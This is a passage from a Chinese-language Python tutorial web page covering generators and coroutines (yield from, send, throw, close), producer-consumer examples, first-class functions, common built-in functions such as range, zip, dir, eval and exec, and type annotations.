            yield x

items = [1, 2, [3, 4, [5, 6], 7], 8]
for x in flatten(items):
    print(x, end=' ')    # 1 2 3 4 5 6 7 8

</textarea>利用一个Node类来表示树结构<textarea>
class Node:
    def __init__(self, value):
        self._value = value
        self._children = []

    def __repr__(self):
        return 'Node({!r})'.format(self._value)

    def add_child(self, node):
        self._children.append(node)

    def __iter__(self):
        return iter(self._children)

    def depth_first(self):
        yield self
        for c in self:
            yield from c.depth_first()

if __name__ == '__main__':
    root = Node(0)
    child1 = Node(1)
    child2 = Node(2)
    root.add_child(child1)
    root.add_child(child2)
    child1.add_child(Node(3))
    child1.add_child(Node(4))
    child2.add_child(Node(5))
    for ch in root.depth_first():
        print(ch)

</textarea><pre>
打开双通道
如果yield from结构唯一的作用是替代产出值的嵌套for循环,这个结构很有可能不会添加到python语言中。yield from结构的本质作用无法通过简单的可迭代对象说明,而要发散思维,使用嵌套的生成器。
yield from的主要功能是打开双向通道,把最外层的调用方与最内层的子生成器连接起来,这样二者可以直接发送和产出值,还可以直接传入异常,而不用在位于中间的协程中添加大量处理异常的样板代码。有了这个结构,协程可以通过以前不可能的方式委托职责。

【 python协程 】
Python的生成器函数和python的协程非常接近,但并不完全,因为生成器然允许暂停执行以生成值,但不提供在执行恢复时传递的值或异常。并且生成器不允许在try/finally块的try部分中暂停执行,因此使中止的协程很难在其自身之后进行清理。

1、将yield重新定义为表达式,而不是语句。当前的yield语句将成为一个yield值表达式,其值将被丢弃。每当通过正常的next调用恢复生成器时yield表达式的值为None
2、为generator-iterators添加了一个新的方法send(),它可以恢复生成器并发送给生成一个值,该值称为yield - expression的结果,send()方法返回生成器产生的下一个值,如果生成器退出而不产生另一个值则引发StopIteration。
3、为generator-iterators添加了一个新的方法throw(),它在生成器暂停时引发异常,并返回生成器产生的下一个值,如果生成器退出而不产生另一个值,则引发StopIteration(如果生成器没有捕获传入的异常,或者引发另外的一个异常,那么该异常会传播给调用者)
4、为generator-iterators添加了一个新的方法close(),在生成器暂停的位置引发一个GeneratorExit异常,如果一个生成器引发了StopIteration异常或GeneratorExit异常,close()方法将返回给它的调用者,如果生成是yield一个值,会引发RuntimeError异常。如果一个生成器引发了任何其他异常,则会传给他的调用者 ,如果生成器,由于异常退出或者已经正常退出,那么close()不执行任何操作。
5、确保了当生成器被垃圾回收的时候执行close()
6、因为垃圾回收或clsoe被调用将允许yield在try/finally块中使用。

【 生成器的close()方法 】
close()方法就是关闭生成器。生成器被关闭后,再次调用next()方法,不管能否遇到yield关键字,都会立即抛出StopIteration异常。

【 生成器的throw()方法 】
除了向生成器函数内部传递参数,还可以传递异常

</pre><textarea>
def throw_gen():
    try:
        yield 'Normal'
    except ValueError:
        yield "Error"
    finally:
        print('Finally')

x = throw_gen()
print(next(x))
print(x.throw(ValueError))
'''
Normal
Error
Finally
'''

</textarea><pre>
throw方法让生成器在被挂起的位置抛出指定的异常,如果生成器捕获了异常并且返回的另外一个值,那么这个值就是g.throw()返回的值
如果生成器没有捕获异常,那么throw()将会引发传递相同的异常,如果生成器引发了另外一个异常,throw调用将引发异常,总之throw()的行为类似next()或send(),除了它在挂起的时候引发异常。如果生成器已经处于关闭状态,throw()只会引发它传递的异常,而不执行任何生成器的代码

generator.throw:会让生成器在暂停的yield表达式处抛出指定的异常,如果生成器处理了抛出的异常,代码会向前执行到下一个yield表达式,而产出的值会成为调用generator.throw方法代码的返回值。如果生成器没有处理抛出的异常,异常会向上冒泡,传到调用方的上下文中。
generator.close:会让生成器在暂停的yield表达式处抛出GeneratorExit异常。如果生成器没有处理这个异常或抛出了StopIteration异常,调用方不会报错,如果收到GeneratorExit异常,生成器一定不能产出值,否则解释器会抛出RuntimeError异常。生成器抛出的异常会向上冒泡,传给调用方。

早期的python协程,语法上协程和生成器看起来也非常类似,也是通过yield关键字如：num = yield

</pre><textarea>
def simple_coroutine():
    print('-->coroutine started')
    x = yield
    print('-->coroutine received: ', x)

coro = simple_coroutine()
print(coro)
next(coro)
coro.send(24)
'''
< generator object simple_coroutine at 0x0000024D2E592B48>
-->coroutine started
-->coroutine received:  24
Traceback (most recent call last):
  File "hello.py", line 9, in < module>
    coro.send(24)
StopIteration
'''

</textarea><pre>
yield的右边没有表达式,所以默认产出的值是None
执行函数时并不会运行生成器函数中的代码,而是返回一个生成器对象
刚开始先调用了next(...)是因为这个时候生成器还没有启动,没有停在yield那里,这个时候也是无法通过send发送数据,所以通过next(...)激活协程后,这个时候开始运行生成器函数,程序就会运行到x = yield
x = yield这个表达式的计算过程是先计算等号右边的内容,然后在进行赋值,所以当激活生成器后程序会停在yield这里,但并没有给x赋值。
当调用send方法后yield会收到这个值并赋值给x,而当程序运行到协程定义体的末尾时和用生成器的时候一样会抛出StopIteration异常

如果协程没有通过next(...)或send(None)的方式激活,但直接send则会报错
关于调用next(...)函数这一步通常称为"预激(prime)"协程,即让协程向前执行到第一个yield表达式,准备好作为活跃的协程使用

协程在运行过程中有四个状态：
GEN_CREATE:等待开始执行
GEN_RUNNING:解释器正在执行,这个状态一般看不到
GEN_SUSPENDED:在yield表达式处暂停
GEN_CLOSED:执行结束

</pre><textarea>
>>> def simple_coro(a):
...     print('->started:a=',a)
...     b = yield a
...     print('->Received:b=',b)
...     c = yield a+b
...     print('->Received:c=',c)
...
>>> coro = simple_coro(12)
>>> from inspect import getgeneratorstate
>>> getgeneratorstate(coro)
'GEN_CREATED'
>>> next(coro)
->started:a= 12
12
>>> getgeneratorstate(coro)
'GEN_SUSPENDED'
>>> coro.send(14)
->Received:b= 14
26
>>> coro.send(16)
->Received:c= 16
Traceback ... StopIteration
>>>

</textarea><pre>
【 生成器的send()方法 】
可以通过send()方法向生成器内部传递参数,send方法只有一个参数,就是发送值到生成器,调用send(None)相当于调用生成器的next()方法,因为开始执行生成器函数时并没有实际执行生成器函数中的代码而是返回一个生成器对象,所以需要调用next()或send(None)来激活协程
next()跟send()不同的地方是,next()只能以None作为参数传递,而send()可以传递yield的值

与next()方法一样,send()方法返回generator-iterator产生的下一个值,如果生成器正常退出或已经退出则引发StopIteration。如果生成器引发未捕获的异常,它将传播到send()的调用者

generator函数调用后,第一次send(None),generator执行到yield之前,之后每次调用send(),从yield所在行开始执行,运行到片段结尾或再次遇到yield,generator从yield中接受参数,如果yield后有表达式则返回表达式的值,类似return关键字的功能。yield关键字保存了generator每次的执行状态。

</pre><textarea>
def count(n):
    x = 0
    while x < n:
        value = yield x
        if value is not None:
            print('Received value: %s' % value)
        x += 1

x = count(5)
print(next(x))
print(x.send('hello'))
print('again')
print(next(x))
'''
0
Received value: hello
1
again
2
'''

</textarea><textarea>
def gener(num):
    while True:
        print("0:before yield num is: %d" % num)
        num = yield
        print("1:after yield num  is %d" % num)
    print("exc end")

g = gener(1)
print('start to send')
g.send(None)
print("goto loop")
for i in range(5):
    print(">>>>send back:" + str(g.send(i)))
'''
start to send
0:before yield num is: 1
goto loop
1:after yield num  is 0
0:before yield num is: 0
>>>>send back:None
1:after yield num  is 1
0:before yield num is: 1
>>>>send back:None
1:after yield num  is 2
0:before yield num is: 2
>>>>send back:None
1:after yield num  is 3
0:before yield num is: 3
>>>>send back:None
1:after yield num  is 4
0:before yield num is: 4
>>>>send back:None
'''

def gener(num):
    while True:
        print("0:before yield num is: %d" % num)
        num = yield num**2 # 代码唯一有变化的地方
        print("1:after yield num  is %d" % num)
    print("exc end")

g = gener(1)
print('start to send')
g.send(None)
print("goto loop")
for i in range(5):
    print(">>>>send back:" + str(g.send(i)))
'''
start to send
0:before yield num is: 1
goto loop
1:after yield num  is 0
0:before yield num is: 0
>>>>send back:0
1:after yield num  is 1
0:before yield num is: 1
>>>>send back:1
1:after yield num  is 2
0:before yield num is: 2
>>>>send back:4
1:after yield num  is 3
0:before yield num is: 3
>>>>send back:9
1:after yield num  is 4
0:before yield num is: 4
>>>>send back:16
'''

</textarea><textarea>
def consumer():
    r = ''
    while True:
        n = yield r
        if not n:
            return      # 跳出当前函数
        print('[CONSUMER] Consuming %s...' %n)
        r = '200 OK'

def produce(c):
    c.send(None)        # 启动生成器
    n = 0
    while n < 5:
        n += 1
        print('[PRODUCER] Producing %s...' %n)
        r = c.send(n)   # 一旦n有值则切换到consumer执行
        print('[PRODUCER] Consumer return: %s'%r)
    c.close()           # 关闭生成器

c = consumer()
produce(c)
consumer()
'''
[PRODUCER] Producing 1...
[CONSUMER] Consuming 1...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 2...
[CONSUMER] Consuming 2...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 3...
[CONSUMER] Consuming 3...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 4...
[CONSUMER] Consuming 4...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 5...
[CONSUMER] Consuming 5...
[PRODUCER] Consumer return: 200 OK
'''

</textarea>利用yield from语句向生成器(协程)传送数据<textarea>
#传统的生产者-消费者模型是一个线程写消息,一个线程取消息,通过锁机制控制队列和等待,但一不小心就可能死锁。
#如果改用协程,生产者生产消息后,直接通过yield跳转到消费者开始执行,待消费者执行完毕后,换回生产者继续生产,效率极高

def consumer_work(len):
    print("writer:")      # 读取send传进的数据,并模拟进行处理数据
    w=''
    while True:
        w = yield w       # w接收send传进的数据,同时也是返回的数据
        print('[CONSUMER] Consuming %s...>> ', w)
        w*=len            # 将返回的数据乘以100
        time.sleep(0.1)

def consumer(coro):
    yield from coro       # 将数据传递到协程(生成器)对象中

def produce(c):
    c.send(None)          # "prime" the coroutine
    for i in range(5):
        print('[Produce] Producing %s----', i)
        w=c.send(i)       # 发送完成后进入协程中执行
        print('[Produce] receive %s----', w)
    c.close()

c1=consumer_work(100)
produce(consumer(c1))

执行结果：
writer:
[Produce] Producing %s---- 0
[CONSUMER] Consuming %s...>>  0
[Produce] receive %s---- 0
[Produce] Producing %s---- 1
[CONSUMER] Consuming %s...>>  1
[Produce] receive %s---- 100
[Produce] Producing %s---- 2
[CONSUMER] Consuming %s...>>  2
[Produce] receive %s---- 200
[Produce] Producing %s---- 3
[CONSUMER] Consuming %s...>>  3
[Produce] receive %s---- 300
[Produce] Producing %s---- 4
[CONSUMER] Consuming %s...>>  4
[Produce] receive %s---- 400

</textarea><pre>
【 python里为什么要使用generator 】
1.容易实现
相对于iterator类来说,generator的实现清晰、简洁,因为generator自动跟踪实现细节,因此更加清晰、简洁。

</pre><textarea>
# 用iterator实现一个2的指数函数
class PowTwo:
    def __init__(self, max = 0):
        self.max = max

    def __iter__(self):
        self.n = 0
        return self

    def __next__(self):
        if self.n > self.max:
            raise StopIteration

        result = 2 ** self.n
        self.n += 1
        return result

# generator实现
def PowTwoGen(max = 0):
    n = 0
    while n < max:
        yield 2 ** n
        n += 1

</textarea><pre>
2.节省内存
一个函数返回一个序列(sequence)的时候会在内存里面把这个序列构建好再返回。如果这个序列包含很多数据的话就会占用大量的内存
而如果序列是以generator方式实现的,就是内存友好的,因为他每次只产生一个item。

</pre>文件读取,如果直接对文件对象调用read()方法会导致不可预测的内存占用。好的方法是利用固定长度的缓冲区来不断读取文件内容。通过 yield不再需要编写读文件的迭代类就可以轻松实现文件读取<textarea>
def read_file(fpath):
    BLOCK_SIZE = 1024
    with open(fpath, 'rb') as f:
        while True:
            block = f.read(BLOCK_SIZE)
            if block:
                yield block
            else:
                return

</textarea><pre>
3.代表无限的stream
generator是一个很棒的表示无限数据流的工具,无限数据流不能被保存在内存里面,并且因为generator每次产生一个item,它就可以表示无限数据流。

</pre>产生所有的奇数<textarea>
def all_even():
    n = 0
    while True:
        yield n
        n += 2

</textarea><pre>
4.generator流水线(pipeline)
generator可以对一系列操作执行流水线操作。
假设有一个快餐连锁店的日志,日志的第四列是每小时售出的披萨数量,想对近5年的这一数据进行求和。
假设所有数据都是字符,不可用的数据都以"N/A"表示,使用generator可以这样实现既高效又易读

</pre><textarea>
with open('sells.log') as file:
    pizza_col = (line[3] for line in file)
    per_hour = (int(x) for x in pizza_col if x != 'N/A')
    print("Total pizzas sold = ",sum(per_hour))

</textarea><pre>
5.模拟并发
Python虽然支持多线程,但是由于GIL(全局解释锁,Global Interpreter Lock)的存在,同一个时间,只能有一个线程在运行,所以无法实现真正的并发。这时就出现了协程。简单说协程就是可以暂停执行的函数",也就是yield。

Python实现协程最简单的方法就是使用yield。当一个函数在执行过程中被阻塞时就用yield挂起,然后执行另一个函数。当阻塞结束后可以用next()或send()唤醒。相比多线程,协程的好处是它在一个线程内执行,避免线程之间切换带来的额外开销,而且协程不存在加锁的步骤

</pre>生产者和消费者<textarea>
def consumer():
    last = ''
    while True:
        receive_val = yield last   # last不需要
        if receive_val is not None:
            print('consume %s' % receive_val)
            last = receive_val

def productor(con, n):
    next(con)
    x = 0
    while x < n:
        x += 1
        print('produce %s' % x)
        con.send(x)  # 生产的数值传给消费者
    con.close()      # 关闭生成器,相当与多线程的close

gen = consumer()
productor(gen, 5)
'''
produce 1
consume 1
produce 2
consume 2
produce 3
consume 3
produce 4
consume 4
produce 5
consume 5
'''

</textarea>
</div>

<div id="function">
<h3>python函数</h3><pre>
函数是组织好的,可重复使用的,用来实现单一或相关联功能的代码段,函数能提高应用的模块性和代码的重复利用率
函数是执行特定任务的一段代码,程序通过将一段代码定义成函数,并为该函数指定一个函数名,这样即可在需要的时候多次调用这段代码,因此函数是代码复用的重要手段

Python的函数是"一等公民",因此函数本身也是一个对象,函数既可用于赋值,也可用作其他函数的参数,还可作为其他函数的返回值。

【 使用函数变量 】
Python的函数也是一种值:所有函数都是function对象,这意味着可以把函数本身赋值给变量,就像把整数、浮点数、列表、元组赋值给变量一样。

</pre>当把函数赋值给变量之后,接下来程序也可通过该变量来调用函数<textarea>
# 定义一个计算乘方的函数
def pow(base, exponent) :
    result = 1
    for i in range(1, exponent + 1) :
        result *= base
    return result

# 将pow函数赋值给my_fun,则my_fun可当成pow使用
my_fun = pow
print(my_fun(3 , 4)) # 输出81

# 定义一个计算面积的函数
def area(width, height) :
    return width * height

# 将area函数赋值给my_fun,则my_fun可当成area使用
my_fun = area
print(my_fun(3, 4)) # 输出12

</textarea><pre>
【 使用函数作为函数形参 】
有时候需要定义一个函数,该函数的大部分计算逻辑都能确定,但某些处理逻辑暂时无法确定,这意昧着某些程序代码需要动态改变,如果希望调用函数时能动态传入这些代码,那么就需要在函数中定义函数形参,这样即可在调用该函数时传入不同的函数作为参数,从而动态改变这段代码。

</pre>Python支持像使用其他参数一样使用函数参数<textarea>
# 定义函数类型的形参,其中fn是一个函数
def map(data, fn) :
    result = []
    # 遍历data列表中每个元素,并用fn函数对每个元素进行计算
    # 然后将计算结果作为新数组的元素
    for e in data :
        result.append(fn(e))
    return result

# 定义一个计算平方的函数
def square(n) :
    return n * n

# 定义一个计算立方的函数
def cube(n) :
    return n * n * n

# 定义一个计算阶乘的函数
def factorial(n) :
    result = 1
    for index in range(2, n + 1) :
        result *= index
    return result

data = [3 , 4 , 9 , 5, 8]
print("原数据: ", data)
# 下面程序代码3次调用map()函数,每次调用时传入不同的函数
print("计算数组元素的平方")
print(map(data , square))
print("计算数组元素的立方")
print(map(data , cube))
print("计算数组元素的阶乘")
print(map(data , factorial))

</textarea>【 使用函数作为返回值 】<textarea>
def get_math_func(type) :

    # 定义一个计算平方的局部函数
    def square(n) :  # ①
        return n * n

    # 定义一个计算立方的局部函数
    def cube(n) :  # ②
        return n * n * n

    # 定义一个计算阶乘的局部函数
    def factorial(n) :   # ③
        result = 1
        for index in range(2 , n + 1):
            result *= index
        return result

    # 返回局部函数
    if type == "square" :
        return square
    if type == "cube" :
        return cube
    else:
        return factorial

# 调用get_math_func(),程序返回一个嵌套函数
math_func = get_math_func("cube") # 得到cube函数
print(math_func(5)) # 输出125
math_func = get_math_func("square") # 得到square函数
print(math_func(5)) # 输出25
math_func = get_math_func("other") # 得到factorial函数
print(math_func(5)) # 输出120

</textarea>

<h4>Python内置函数</h4><pre>
可在官网https://docs.python.org/3/library/functions.html查看,也可以在交互式命令行通过help(abs)查看abs函数的帮助信息)
abs() divmod()  input() open()  staticmethod() all() enumerate() int() ord() str()
any() eval()  isinstance()  pow() sum() basestring()  execfile()  issubclass()  print() super()
bin() file()  iter()  property()  tuple() bool()  filter()  len() range() type()
bytearray() float() list()  raw_input() unichr() callable()  format()  locals()  reduce()  unicode()
chr() frozenset() long()  reload()  vars() classmethod() getattr() map() repr()
cmp() globals() max() reverse() zip() compile() hasattr() memoryview()  round() __import__()
complex() hash()  min() set() delattr() help()  next()  setattr()
dict()  hex() object()  slice() dir() id()  oct() sorted()  exec内置表达式

函数名其实就是指向一个函数对象的引用,完全可以把函数名赋给一个变量,相当于给这个函数起了一个"别名":
>>> a = abs    # 变量a指向abs函数
>>> a(-1)      # 所以也可以通过a调用abs函数

【 range()函数 】
Python提供一个内置的range()函数可以生成一系列连续的整数即一个不可变的整数序列类型,多用于for循环中,可通过list()函数可以转换为list

range(stop)
range(start, stop[, step])
start:用于指定计数的起始值,如果省略不写则默认从0开始。
end:用于指定计数的结束值(不包括此值),给定的终止数值并不在要生成的序列里,此参数不能省略。
step:用于指定步长,即两个数之间的间隔,也可为负数,如果省略则默认步长为1

range()所返回的对象在许多方面表现得像一个列表,但实际上却并不是,此对象会在迭代它时基于所希望的序列返回连续的项,但它没有真正生成列表,这样就能节省空间,这样的对象是可迭代的,也就是说适合作为函数和结构体的参数,这些函数和结构体期望在迭代结束之前可以从中获取连续的元素,for语句就是这样一个迭代器。函数list()是另外一个,它从可迭代对象中创建列表。

</pre><textarea>
r = range(10)
print(r)         # range(0, 10)
print(type(r))   # < class 'range'>
print(list(r))   # [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]

print(list(range(1,10)))            # [1, 2, 3, 4, 5, 6, 7, 8, 9]
print(list(range(1,10,2)))          # [1, 3, 5, 7, 9]
print(list(range(-10, -100, -30)))  # [-10, -40, -70]

for x in range(10):
    print(x, end=' ')      # 0 1 2 3 4 5 6 7 8 9

</textarea><pre>
【 zip()函数 】
zip(*iterables)
zip()函数可以把两个列表"压缩"成一个zip对象(可迭代对象),这样就可以使用一个循环并行遍历两个列表
zip()创建一个聚合了来自每个可迭代对象中的元素的迭代器,返回一个元组的迭代器,其中的第i个元组包含来自每个参数序列或可迭代对象的第i个元素, 当所输入可迭代对象中最短的一个被耗尽时迭代器将停止迭代;当只有一个可迭代对象参数时它将返回一个单元组的迭代器;不带参数时返回一个空迭代器

zip()会保证可迭代对象按从左至右的顺序被求值,使得可以通过zip(*[iter(s)]*n)这样的惯用形式将一系列数据聚类为长度为n的分组,这将重复同样的迭代器n次,以便每个输出的元组具有第n次调用该迭代器的结果。 它的作用效果就是将输入拆分为长度为n的数据块。

当不用关心较长可迭代对象末尾不匹配的值时则zip()只须使用长度不相等的输入即可,如果那些值很重要则应改用itertools.zip_longest()

</pre><textarea>
# zip()函数压缩得到的可迭代对象所包含的元素是由原列表元素组成的元组
a = ['a','b','c']
b = [1, 2, 3]
print([x for x in zip(a,b)])     # [('a', 1), ('b', 2), ('c', 3)]

# 如果zip()函数压缩的两个列表长度不相等,那么zip()函数将以长度更短的列表为准
a = ['a','b','c']
c = [0.1 ,0.2]
print([x for x in zip(a,c)])     # [('a', 0.1), ('b', 0.2)]

# 压缩多个列表,如果使用zip()函数压缩N个列表,那么zip()函数返回的可迭代对象的元素就是长度为N的元组
print([x for x in zip(a, b, c)]) # [('a', 1, 0.1), ('b', 2, 0.2)]

# 使用zip()函数来实现并行遍历的效果
books = ['疯狂Kotlin讲义', '疯狂Swift讲义', '疯狂Python讲义']
prices = [79, 69, 89]
# 使用zip()函数压缩两个列表,从而实现并行遍历
for book, price in zip(books, prices):
    print("%s的价格是: %5.2f" % (book, price))

# zip()与*运算符相结合可以用来拆解一个列表:
x = [1, 2, 3]
y = [4, 5, 6]
zipped = zip(x, y)
print(list(zipped))                    # [(1, 4), (2, 5), (3, 6)]
x2, y2 = zip(*zip(x, y))
print(x2, y2)                          # (1, 2, 3) (4, 5, 6)
print(x == list(x2) and y == list(y2)) # True

</textarea><pre>
【 all(iterable) 】
如果iterable的所有元素为真或迭代器为空则返回True

【 any(iterable) 】
如果iterable的任一元素为真则返回True,如果迭代器为空则返回False

【 id(object) 】
返回对象的"标识值"。该值是一个整数,在此对象的生命周期中保证是唯一且恒定的。两个生命期不重叠的对象可能具有相同的id()值

【 ascii(object) 】
就像函数repr(),返回一个对象可打印的字符串,但repr()返回的字符串中非ASCII编码的字符,会使用\x、\u和\U来转义

【 ord(c) 】
对表示单个Unicode字符的字符串返回代表它Unicode码点的整数。例如ord('a')返回整数97, ord('€')(欧元符号返回8364,这是chr()的逆函数

【 chr(i) 】
返回Unicode码位为整数i的字符的字符串格式。例如chr(97)返回字符串'a',chr(8364)返回字符串'€'。这是ord()的逆函数。
实参的合法范围是0到1,114,111(16进制表示是0x10FFFF)。如果i超过这个范围会触发ValueError异常。

【 help([object]) 】
启动内置的帮助系统,此函数主要在交互式中使用。如果没有实参解释器控制台里会启动交互式帮助系统。如果实参是一个字符串则在模块、函数、类、方法、关键字或文档主题中搜索该字符串,并在控制台上打印帮助信息。如果实参是其他任意对象则会生成该对象的帮助页。
如果在函数的形参列表中出现了斜杠/则它在发起调用help()的时候意味着斜杠之前的均为仅限位置形参
该函数通过site模块加入到内置命名空间。

【 dir([object]) 】
如果没有实参则返回当前本地作用域中的名称列表,列出所有类型的名称:变量,模块,函数等,如果有实参则会尝试返回该对象的有效属性列表。
如果对象有一个名为__dir__()的方法,那么该方法将被调用,并且必须返回一个属性列表。这允许实现自定义__getattr__()或__getattribute__()函数的对象能够自定义dir()来报告它们的属性。
如果对象不提供__dir__(),这个函数会尝试从对象已定义的__dict__属性和类型对象收集信息。结果列表并不总是完整的,如果对象有自定义__getattr__(),那结果可能不准确。

默认的dir()机制对不同类型的对象行为不同,它会试图返回最相关而不是最全的信息:
如果对象是模块对象,则列表包含模块的属性名称。
如果对象是类型或类对象,则列表包含它们的属性名称,并且递归查找所有基类的属性。
否则,列表包含对象的属性名称,它的类属性名称,并且递归查找它的类的所有基类的属性。

dir()不会列出内置函数和变量的名称,如果想要这些,它们的定义是在标准模块builtins中
import builtins
dir(builtins)

</pre>内置函数dir()用于查找模块定义的名称,返回一个排序过的字符串列表<textarea>
>>> import struct
>>> dir()   # show the names in the module namespace  # doctest: +SKIP
['__builtins__', '__name__', 'struct']
>>> dir(struct)   # show the names in the struct module # doctest: +SKIP
['Struct', '__all__', '__builtins__', '__cached__', '__doc__', '__file__',
 '__initializing__', '__loader__', '__name__', '__package__',
 '_clearcache', 'calcsize', 'error', 'pack', 'pack_into',
 'unpack', 'unpack_from']
>>> class Shape:
...     def __dir__(self):
...         return ['area', 'perimeter', 'location']
>>> s = Shape()
>>> dir(s)
['area', 'location', 'perimeter']

</textarea><pre>
【 eval(expression, globals=None, locals=None) 】
实参是一个字符串及可选的globals和locals。globals实参必须是一个字典。locals可以是任何映射对象。

expression参数会作为一个Python表达式(从技术上说是一个条件列表)被解析并求值,使用globals和locals字典作为全局和局部命名空间。 如果globals字典存在且不包含以__builtins__为键的值则会在解析expression之前插入以此为键的对内置模块builtins的字典的引用。 这意味着expression通常具有对标准builtins模块的完全访问权限且受限的环境会被传播。 如果省略locals字典则其默认值为globals字典。 如果两个字典同时省略,表达式会在eval()被调用的环境中执行。 返回值为表达式求值的结果。 语法错误将作为异常被报告

</pre><textarea>
>>> x = 1
>>> eval('x+1')
2

</textarea><pre>
这个函数也可以用来执行任何代码对象如compile()创建的,这种情况下参数是代码对象,而不是字符串。如果编译该对象时的mode实参是'exec'那么eval()返回值为None

exec()函数支持动态执行语句。 globals()和locals()函数各自返回当前的全局和本地字典,因此可以将它们传递给eval()或exec()来使用。

【 exec(object[, globals[, locals]]) 】
这个函数支持动态执行Python代码。object必须是字符串或代码对象。如果是字符串,那么该字符串将被解析为一系列Python语句并执行(除非发生语法错误)。如果是代码对象,它将被直接执行。在任何情况下被执行的代码都需要和文件输入一样是有效的。即使在传递给exec()函数的代码的上下文中,return和yield语句也不能在函数定义之外使用。该函数返回值是None

无论哪种情况,如果省略了可选参数,代码将在当前范围内执行。如果提供了globals参数就必须是字典类型,而且会被用作全局和本地变量。如果同时提供了globals和locals参数,它们分别被用作全局和本地变量。如果提供了locals参数,则它可以是任何映射型的对象。请记住在模块层级,全局和本地变量是相同的字典。如果exec有两个不同的globals和locals对象,代码就像嵌入在类定义中一样执行。

如果globals字典不包含__builtins__键值,则将为该键插入对内建builtins模块字典的引用。因此在将执行的代码传递给exec()之前,可以通过将自己的__builtins__字典插入到globals中来控制可以使用哪些内置代码。

内置globals()和locals()函数各自返回当前的全局和本地字典,因此可以将它们传递给exec()的第二个和第三个实参。
默认情况下locals的行为如下面locals()函数描述的一样:不要试图改变默认的locals字典。如果想在exec()函数返回时知道代码对locals的变动,请明确地传递locals字典。

【 filter(function, iterable) 】
用iterable中函数function返回真的那些元素,构建一个新的迭代器。iterable可以是一个序列,一个支持迭代的容器,或一个迭代器。如果function是None 则会假设它是一个身份函数,即iterable中所有返回假的元素会被移除。

filter(function, iterable)相当于一个生成器表达式,当function不是None的时候为(item for item in iterable if function(item));function是None的时候为(item for item in iterable if item)

【 format(value[, format_spec]) 】
将value转换为format_spec控制的格式化表示。format_spec的解释取决于value实参的类型,但是大多数内置类型使用标准格式化语法:格式规格迷你语言
默认的format_spec是一个空字符串,它通常和调用str(value)的结果相同。

调用format(value, format_spec)会转换成type(value).__format__(value, format_spec) ,所以实例字典中的__format__()方法将不会调用。如果搜索到object有这个方法但format_spec不为空,format_spec或返回值不是字符串会触发TypeError异常

【 getattr(object, name[, default]) 】
返回对象命名属性的值。name必须是字符串。如果该字符串是对象的属性之一则返回该属性的值,例如getattr(x, 'foobar')等同于x.foobar。如果指定的属性不存在且提供了default值则返回它,否则触发AttributeError。

【 setattr(object, name, value) 】
此函数与getattr()两相对应,其参数为一个对象、一个字符串和一个任意值。 字符串指定一个现有属性或者新增属性,函数会将值赋给该属性,只要对象允许这种操作,例如setattr(x, 'foobar', 123)等价于x.foobar = 123

【 hasattr(object, name) 】
该实参是一个对象和一个字符串。如果字符串是对象的属性之一的名称则返回True,否则返回False,此功能是通过调用getattr(object, name)看是否有AttributeError异常来实现的

【 hash(object) 】
返回该对象的哈希值(如果它有的话)。哈希值是整数。它们在字典查找元素时用来快速比较字典的键。相同大小的数字变量有相同的哈希值(即使它们类型不同如1和1.0
如果对象实现了自己的__hash__()方法,hash()根据机器的字长来截断返回值

</pre>

<h4>类型标注</h4><pre>
自python3.5开始,PEP484为python引入了类型注解(type hints)
类型检查防止运行时出现参数和返回值类型、变量类型不符合。
作为开发文档附加说明,方便使用者调用时传入和返回参数类型。
该模块加入后并不会影响程序的运行,不会报正式的错误,只有提醒pycharm目前支持typing检查,参数类型错误会黄色提示,pycharm只是提出了警告,但实际上运行是不会报错,毕竟python的本质还是动态语言

常用类型
int,long,float: 整型,长整形,浮点型
bool,str: 布尔型,字符串类型
List, Tuple, Dict, Set:列表,元组,字典, 集合
Iterable,Iterator:可迭代类型,迭代器类型
Generator：生成器类型

</pre><textarea>
def test(a:int, b:str) -> str:
    print(a, b)
    return 1000

def _unimplemented_method(*args: str, **kwargs: str) -> None:
    pass

def request(application: "Application", request: httputil.HTTPServerRequest, **kwargs: Any) -> None:
    pass

def prepare() -> Optional[Awaitable[None]]:
    pass

def get_argument(self, name: str, default: str, strip: bool = True) -> str:
    pass

def set_status(self, status_code: int, reason: str = None) -> None:
    pass

if __name__ == '__main__':
    test('test', 'abc')

</textarea>

<h4>自定义函数</h4><pre>
除了可以直接使用的内置函数外,Python还支持自定义函数,即将一段有规律的、可重复使用的代码定义成函数,从而达到一次编写、多次调用的目的

1、执行到return [表达式]函数就执行完毕,并将结果返回;如果没有return语句,函数执行完毕后也会返回结果,只是结果为None,return None可以简写为return
2、在Python交互环境中定义函数时,Python会出现...的提示,函数定义结束后需要按两次回车重新回到>>>提示符下
3、函数参数的作用是传递数据给函数,令其对接收的数据做具体的操作处理

函数调用
定义一个函数只给了函数一个名称,指定了函数里包含的参数和代码块结构,这个函数的基本结构完成以后,可以通过另一个函数调用执行,也可以直接从Python提示符执行

</pre>语法<textarea>
# functionname.py
def functionname( parameters ):
   "函数的说明文档,字符串类型,程序既可通过help()函数查看函数的说明文档,也可通过函数的__doc__属性访问函数的说明文档"
   function_suite
   return [expression]

# 导入functionname函数
from functionname import functionname

# 查看自定义函数functionname的帮助文档
help(functionname)
print(functionname.__doc__)

</textarea>实例<textarea>
# 定义函数
def printme( str ):
   "打印任何传入的字符串"
   print(str)
   return

# 调用函数
printme("我要调用用户自定义函数!");
printme("再次调用同一函数");

</textarea><pre>
【 函数标注 Function Annotations 】
函数标注是关于用户自定义函数中使用的类型的完全可选元数据信息

函数标注以字典的形式存放在函数的__annotations__属性中,并且不会影响函数的任何其他部分。 形参标注的定义方式是在形参名称后加上冒号,后面跟一个表达式,该表达式会被求值为标注的值。 返回值标注的定义方式是加上一个组合符号 ->,后面跟一个表达式,该标注位于形参列表和表示 def 语句结束的冒号之间。 下面的示例有一个位置参数,一个关键字参数以及返回值带有相应标注

这种注释只是一种提醒/声明,但程序的运行不受限与这些类型

</pre><textarea>
def f(ham: str, eggs: str = 'eggs') -> str:
    print("Annotations:", f.__annotations__)
    print("Arguments:", ham, eggs)
    return ham, eggs
f('spam')
f(1)
print(f.__annotations__)

'''
Annotations: {'ham': < class 'str'>, 'eggs': < class 'str'>, 'return': < class 'str'>}
Arguments: spam eggs
Annotations: {'ham': < class 'str'>, 'eggs': < class 'str'>, 'return': < class 'str'>}
Arguments: 1 eggs
{'ham': < class 'str'>, 'eggs': < class 'str'>, 'return': < class 'str'>}
'''

